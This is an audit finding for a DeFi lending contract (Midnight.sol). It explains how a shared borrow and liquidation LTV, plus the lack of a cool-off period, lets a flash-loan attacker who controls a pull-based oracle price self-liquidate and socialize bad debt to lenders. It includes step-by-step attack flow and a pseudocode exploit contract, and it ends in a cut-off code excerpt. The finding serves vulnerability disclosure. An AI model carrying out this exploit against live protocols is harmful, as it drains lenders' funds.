### Title
No Borrow-LTV / Liquidation-LTV Gap Combined with No Cool-Off Period Enables Flash-Loan-Financed Bad-Debt Attack — (`src/Midnight.sol`)

---

### Summary

Midnight uses a single `lltv` parameter for both the borrowing health check (`isHealthy`) and the liquidation eligibility check (`liquidate`). There is no separate, lower "borrow LTV" that would create a safety buffer before the liquidation threshold. Combined with the absence of any cross-block cool-off period, an attacker using a pull-based oracle (Pyth, Redstone) can atomically borrow at the exact liquidation edge, flip the oracle price, and liquidate their own position in the same transaction, creating bad debt that is immediately socialized to all lenders.

---

### Finding Description

**Root cause 1 — Identical LTV for borrowing and liquidation**

`isHealthy` computes `maxDebt` using `lltv`:

```
maxDebt += collateral[i] * price / ORACLE_PRICE_SCALE * lltv / WAD
```

`liquidate` computes the same `maxDebt` with the same `lltv` to decide whether the position is liquidatable:

```
maxDebt += _collateral.mulDivDown(price, ORACLE_PRICE_SCALE).mulDivDown(_collateralParam.lltv, WAD);
require(... originalDebt > maxDebt, NotLiquidatable());
```

There is no separate "borrow cap LTV" below `lltv`. A borrower can therefore borrow up to the exact liquidation threshold. Any infinitesimal price decline makes the position immediately liquidatable.

**Root cause 2 — No cross-block (or even cross-call) cool-off period**

The only liquidation lock in the protocol is a transient-storage flag set at the start of `take()` and cleared before the final health check at the end of `take()`:

```solidity
bool wasLocked = UtilsLib.tExchange(LIQUIDATION_LOCK_SLOT, id, seller, true);
// ... callbacks ...
if (!wasLocked) UtilsLib.tExchange(LIQUIDATION_LOCK_SLOT, id, seller, false);
require(liquidationLocked(id, seller) || isHealthy(offer.market, id, seller), SellerIsLiquidatable());
```

Once `take()` returns, the lock is gone. A subsequent `liquidate()` call in the same transaction (from a custom attacker contract) is not blocked.

**Attack flow (single transaction, pull-based oracle)**

1. Attacker's contract calls `Midnight.flashLoan()` to obtain collateral tokens.
2. Inside the flash-loan callback:
   a. Push old (higher) price `P_old` to the pull-based oracle.
   b. Call `Midnight.supplyCollateral()` for attacker account A.
   c. Call `Midnight.take()` — account A borrows `debt = collateral * P_old * lltv / WAD` (maximum possible). The health check at line 476 passes because the oracle still returns `P_old`.
   d. Push new (lower) price `P_new` to the oracle.
   e. Call `Midnight.liquidate()` from attacker account B against account A. The oracle now returns `P_new`, so `originalDebt > maxDebt` and the position is liquidatable.
   f. `badDebt` is computed and immediately socialized to all lenders via `lossFactor`.
   g. Repay the flash loan from the seized collateral.

**Bad-debt condition (concrete numbers)**

`badDebt > 0` when `debt > collateral * P_new / ORACLE_PRICE_SCALE * WAD / maxLif`, i.e. when:

```
P_new < P_old * lltv * maxLif / WAD
```

For `LLTV_7 = 0.98`, cursor `0.5`: `maxLif = WAD / (WAD - 0.5*(WAD - 0.98*WAD)) = 1/0.99 ≈ 1.0101`, so `lltv * maxLif ≈ 0.99`. A price drop of **just over 1%** is sufficient to create bad debt.

For `LLTV_5 = 0.945`, cursor `0.5`: `lltv * maxLif ≈ 0.972`. A **~2.8% price drop** suffices.

---

### Impact Explanation

- **Direct loss of lender funds**: bad debt is socialized immediately via `lossFactor`, permanently reducing every lender's credit in the market.
- **Protocol insolvency**: repeated attacks drain the market's `totalUnits`, eventually making the `lossFactor` approach `type(uint128).max`, at which point `take()` reverts (`MarketLossFactorMaxedOut`), permanently freezing the market.
- **Flash-loan financed**: no capital is required beyond gas; the attack is risk-free for the attacker.

---

### Likelihood Explanation

- Pull-based oracles (Pyth, Redstone) are explicitly mentioned as intended integrations in the external report context and are compatible with the `IOracle` interface.
- For high-LLTV markets (0.98), only a 1% price swing is needed — routine for any volatile asset.
- The attack is fully atomic (single transaction), requires no privileged access, and can be financed entirely with the protocol's own `flashLoan`.
- The attacker needs two EOAs/contracts (borrower A, liquidator B), both trivially controlled.

---

### Recommendation

1. **Introduce a separate borrow LTV below `lltv`**: add a `borrowLtv` field to `CollateralParams` (enforced `borrowLtv < lltv`) and use it in `isHealthy` / the `take()` health check, while keeping `lltv` only for liquidation eligibility. This forces the attacker to find a price jump larger than the gap.

2. **Add a cross-block cool-off period**: record `lastHealthyTimestamp` for each position whenever a health check passes, and require `block.timestamp > lastHealthyTimestamp + coolOffPeriod` before allowing liquidation. This prevents flash-loan-financed same-block attacks entirely.

### Proof of Concept

```solidity
// Attacker contract (pseudocode)
contract Exploit is IFlashLoanCallback, ISellCallback {
    Midnight midnight;
    IPullOracle oracle;
    address accountA; // borrower (this contract)
    address accountB; // liquidator (separate EOA)

    function attack() external {
        // 1. Flash-loan collateral
        address[] memory tokens = new address[](1);
        tokens[0] = collateralToken;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = COLLATERAL_AMOUNT;
        midnight.flashLoan(tokens, amounts, address(this), "");
    }

    function onFlashLoan(...) external returns (bytes32) {
        // 2a. Push old price to pull-based oracle
        oracle.updatePrice(P_OLD);

        // 2b. Supply collateral for accountA (this contract)
        midnight.supplyCollateral(market, 0, COLLATERAL_AMOUNT, address(this));

        // 2c. Borrow at max LLTV via take() — health check passes at P_OLD
        midnight.take(sellOffer, ratifierData, MAX_UNITS, address(this), ...);
        // After take() returns, liquidation lock is cleared

        // 2d. Push new lower price
        oracle.updatePrice(P_NEW); // P_NEW < P_OLD * lltv * maxLif / WAD

        // 2e. Liquidate accountA from accountB — bad debt created, socialized to lenders
        midnight.liquidate(market, 0, 0, MAX_UNITS, address(this), false, accountB, address(0), "");

        // 2f. Repay flash loan from seized collateral (accountB sends back)
        IERC20(collateralToken).transferFrom(accountB, address(this), COLLATERAL_AMOUNT);
        return CALLBACK_SUCCESS;
    }
}
```

**Expected outcome**: `marketState[id].lossFactor` increases after the attack, permanently reducing all lenders' credit. The attacker (via `accountB`) retains seized collateral worth more than the repaid debt units, netting a profit at lenders' expense.

    function isHealthy(Market memory market, bytes32 id, address borrower) public view returns (bool) {
        Position storage _position = position[id][borrower];
        uint256 debt = _position.debt;
        uint256 maxDebt;
        if (debt > 0) {
            uint128 _collateralBitmap = _position.collateralBitmap;
            while (_collateralBitmap != 0) {
                uint256 i = UtilsLib.msb(_collateralBitmap);
                CollateralParams memory collateralParam = market.collateralParams[i];
                uint256 price = IOracle(collateralParam.oracle).price();
                maxDebt += _position.collateral[i].mulDivDown(price, ORACLE_PRICE_SCALE)
                    .mulDivDown(collateralParam.lltv, WAD);
                _collateralBitmap = _collateralBitmap.clearBit(i);
            }
        }
        return maxDebt >= debt;
